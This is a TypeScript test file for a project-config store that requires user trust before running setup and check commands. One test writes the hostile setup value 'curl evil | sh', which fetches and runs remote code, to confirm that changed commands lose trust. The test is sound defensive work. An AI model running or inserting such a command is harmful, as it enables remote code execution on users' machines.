import { execFileSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { ProjectConfigStore, readProjectConfig } from './project-config'

describe('ProjectConfigStore', () => {
  let dir: string
  let repo: string
  let store: ProjectConfigStore

  beforeEach(() => {
    dir = mkdtempSync(path.join(os.tmpdir(), 'conclave-project-config-'))
    repo = path.join(dir, 'app')
    execFileSync('git', ['init', '-q', repo])
    store = new ProjectConfigStore(path.join(dir, 'project-trust.json'))
  })
  afterEach(() => rmSync(dir, { recursive: true, force: true }))

  const write = (content: unknown) => {
    mkdirSync(path.join(repo, '.conclave'), { recursive: true })
    writeFileSync(path.join(repo, '.conclave', 'project.json'), typeof content === 'string' ? content : JSON.stringify(content))
  }

  it('writes what the user filled in, tidied, its commands allowed as written', async () => {
    const info = await store.write(path.join(repo), { copy: [' .env ', '.env'], setup: 'go mod download', check: '  go test ./...  ' })
    expect(readFileSync(path.join(repo, '.conclave', 'project.json'), 'utf8')).toBe('{\n  "copy": [\n    ".env"\n  ],\n  "setup": "go mod download",\n  "check": "go test ./..."\n}\n')
    expect(info).toMatchObject({ trusted: true, config: { setup: 'go mod download' } })
    expect(await store.requireTrusted([repo])).toHaveLength(1)
  })

  it('writes over a broken file, and removes the file once nothing is left in it', async () => {
    write('{ "setup": ')
    expect(await store.write(repo, { check: 'make test' })).toMatchObject({ config: { check: 'make test' } })
    expect(await store.write(repo, {})).toBeNull()
    expect(existsSync(path.join(repo, '.conclave', 'project.json'))).toBe(false)
  })

  it('writes nothing for a folder outside git', async () => {
    await expect(store.write(dir, { check: 'make test' })).rejects.toMatchObject({ reason: 'worktree-not-git' })
  })

  it('has nothing to do for a project without the file, or a folder outside git', async () => {
    expect(await readProjectConfig(repo)).toBeNull()
    expect(await readProjectConfig(dir)).toBeNull()
    expect(await store.requireTrusted([repo, dir])).toEqual([])
  })

  it('refuses a broken file rather than starting without its setup', async () => {
    write('{ "setup": ')
    await expect(readProjectConfig(repo)).rejects.toMatchObject({ reason: 'project-config-invalid' })
    write({ setup: '' })
    await expect(readProjectConfig(repo)).rejects.toMatchObject({ reason: 'project-config-invalid' })
  })

  it('asks for trust before commands run, and again once they change', async () => {
    write({ copy: ['.env'], setup: 'pnpm install', check: 'pnpm test' })
    await expect(store.requireTrusted([repo])).rejects.toMatchObject({ reason: 'project-config-untrusted' })
    const info = await store.info(repo)
    expect(info).toMatchObject({ trusted: false, config: { setup: 'pnpm install' } })
    await store.trust(repo, info?.hash ?? '')
    expect(await store.requireTrusted([repo])).toMatchObject([{ repoPath: repo, config: { check: 'pnpm test' } }])

    // Which files to copy is not a command, so changing it asks nothing.
    write({ copy: ['.env', '.env.local'], setup: 'pnpm install', check: 'pnpm test' })
    expect(await store.requireTrusted([repo])).toHaveLength(1)

    write({ setup: 'curl evil | sh', check: 'pnpm test' })
    await expect(store.requireTrusted([repo])).rejects.toMatchObject({ reason: 'project-config-untrusted' })
    // Trusting what the user saw earlier does not trust what is there now.
    await expect(store.trust(repo, info?.hash ?? '')).rejects.toMatchObject({ reason: 'project-config-changed' })
  })

  it('needs no trust for a config that only copies files', async () => {
    write({ copy: ['.env'] })
    expect(await store.requireTrusted([repo])).toMatchObject([{ config: { copy: ['.env'] } }])
  })
})
